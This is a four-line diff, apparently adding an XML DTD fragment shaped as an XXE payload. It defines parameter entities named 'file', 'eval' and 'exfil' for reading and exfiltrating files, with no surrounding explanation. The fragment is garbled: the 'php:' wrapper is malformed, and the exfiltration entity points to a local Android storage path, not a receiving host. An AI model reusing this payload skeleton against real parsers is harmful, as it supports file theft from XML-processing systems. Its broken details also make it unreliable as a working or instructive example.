@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM
+"php: storage/emulated/0/VsCode">
+<!ENTITY % eval
+"<!ENTITY &#x25; exfil SYSTEM 'storage/emulated/0/VsCode'>">
